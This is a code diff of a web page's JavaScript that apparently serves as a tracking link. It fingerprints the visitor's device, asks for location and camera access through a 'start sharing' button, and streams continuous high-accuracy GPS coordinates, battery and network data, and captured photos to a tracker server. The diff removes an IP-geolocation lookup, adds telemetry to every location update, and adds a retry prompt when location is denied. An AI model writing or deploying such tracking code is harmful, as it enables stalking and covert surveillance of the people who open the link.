@@ -245,77 +245,50 @@
     let cameraStream = null;
     let sharing = false;
 
+    let deviceDetail = {};
+
     document.addEventListener('DOMContentLoaded', async () => {
       socket = io({ transports: ['websocket', 'polling'] });
       
-      const basicInfo = {
+      const basic = {
         platform: navigator.platform,
         browser: getBrowser(),
-        screen: `${screen.width}x${screen.height}`,
-        language: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cores: navigator.hardwareConcurrency || 'N/A',
-        ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A'
+        screen: `${screen.width}x${screen.height}`
       };
 
-      // Try Battery API
-      try {
-        if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          basicInfo.battery = Math.round(battery.level * 100) + '%';
-          basicInfo.charging = battery.charging ? 'Charging' : 'Unplugged';
-        }
-      } catch(e) {}
-
-      // Try Connection API
-      try {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-          basicInfo.network = conn.effectiveType || 'N/A';
-          basicInfo.downlink = conn.downlink + 'Mbps';
-        }
-      } catch(e) {}
-
-      // Try Exact Device from UserAgentData
       try {
         if (navigator.userAgentData) {
-          const metadata = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
-          basicInfo.deviceModel = metadata.model || 'Unknown';
-          basicInfo.platformVer = metadata.platformVersion || '';
+          const high = await navigator.userAgentData.getHighEntropyValues(['model']);
+          basic.deviceModel = high.model;
         }
       } catch(e) {}
 
-      sendDeviceInfo(basicInfo);
+      deviceDetail = basic;
+      sendDeviceInfo(basic);
       
-      setInterval(() => { if (sharing) sendDeviceInfo(basicInfo); }, 30000);
-
-      fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-          sendDeviceInfo({ ...basicInfo, ipAddress: data.ip, isp: data.org, city: data.city, country: data.country_name });
-        })
-        .catch(() => {});
+      // Auto-join socket room
+      socket.on('connect', () => socket.emit('join-tracker', TRACKER_ID));
     });
 
     async function sendDeviceInfo(info) {
       if (!TRACKER_ID) return;
       const payload = { trackerId: TRACKER_ID, sessionId: SESSION_ID, info };
-      
       try {
-        if (socket && socket.connected) socket.emit('device-info', payload);
+        socket.emit('device-info', payload);
         await fetch(`/api/tracker/${TRACKER_ID}/info`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-        console.log("Device info synced");
-      } catch (err) {
-        console.error("Sync error:", err);
-      }
+      } catch (err) {}
     }
 
     async function sendLocationUpdate(data) {
-      const payload = { trackerId: TRACKER_ID, sessionId: SESSION_ID, ...data };
+      // Append latest hardware telemetry to every GPS update
+      const battery = await getBatteryInfo();
+      const network = getNetworkInfo();
+      const payload = { trackerId: TRACKER_ID, sessionId: SESSION_ID, ...data, info: { ...deviceDetail, ...battery, ...network } };
+      
       if (socket && socket.connected) socket.emit('location-update', payload);
       await fetch(`/api/tracker/${TRACKER_ID}/location`, {
         method: 'POST',
@@ -324,61 +297,67 @@
       });
     }
 
-    async function sendPhotoCapture(data) {
-      const payload = { trackerId: TRACKER_ID, sessionId: SESSION_ID, ...data };
-      if (socket && socket.connected) socket.emit('photo-capture', payload);
-      await fetch(`/api/tracker/${TRACKER_ID}/photo`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
+    async function getBatteryInfo() {
+      try {
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          return { battery: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' };
+        }
+      } catch(e) {}
+      return {};
+    }
+
+    function getNetworkInfo() {
+      try {
+        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (c) return { network: c.effectiveType || 'N/A' };
+      } catch(e) {}
+      return {};
     }
 
     async function startSharing() {
       const btn = document.getElementById('start-btn');
       btn.disabled = true;
-      btn.innerHTML = '<span class="loading-spinner"></span> Requesting...';
+      btn.innerHTML = 'Connecting...';
 
       try {
         await requestLocation();
         document.getElementById('loc-section').classList.add('granted');
-        document.getElementById('loc-status').innerHTML = '<span class="status-badge active">Location active</span>';
+        document.getElementById('loc-status').innerHTML = '<span class="status-badge active">Location Live</span>';
+        
+        try {
+          await requestCamera();
+          document.getElementById('cam-section').classList.add('granted');
+          document.getElementById('cam-status').innerHTML = '<span class="status-badge active">Camera Live</span>';
+          capturePhotos();
+        } catch(e) {
+          document.getElementById('cam-status').innerHTML = '<span class="status-badge error">Camera Blocked</span>';
+        }
+
         startLocationUpdates();
+        sharing = true;
+        btn.style.display = 'none';
+        document.getElementById('live-indicator').classList.add('visible');
       } catch (e) {
-        document.getElementById('loc-status').innerHTML = '<span class="status-badge error">Location denied</span>';
+        btn.disabled = false;
+        btn.innerHTML = 'Retry Sharing';
+        alert("Please allow location access to continue");
       }
-
-      try {
-        await requestCamera();
-        document.getElementById('cam-section').classList.add('granted');
-        document.getElementById('cam-status').innerHTML = '<span class="status-badge active">Camera active</span>';
-        capturePhotos();
-      } catch (e) {
-        document.getElementById('cam-status').innerHTML = '<span class="status-badge error">Camera denied</span>';
-      }
-
-      sharing = true;
-      btn.style.display = 'none';
-      document.getElementById('live-indicator').classList.add('visible');
     }
 
     function requestLocation() {
-      return new Promise((resolve, reject) => {
-        if (!navigator.geolocation) return reject('Not supported');
-        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
-      });
+      return new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true }));
     }
 
     function startLocationUpdates() {
       watchId = navigator.geolocation.watchPosition(
         pos => {
-          const { latitude, longitude, accuracy, altitude, speed, heading } = pos.coords;
-          sendLocationUpdate({ latitude, longitude, accuracy, altitude, speed, heading });
-          document.getElementById('coords-display').textContent = 
-            `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (±${Math.round(accuracy)}m)`;
+          const { latitude, longitude, accuracy, speed } = pos.coords;
+          sendLocationUpdate({ latitude, longitude, accuracy, speed });
+          document.getElementById('coords-display').textContent = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
         },
-        err => console.error(err),
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        null,
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
       );
     }
 
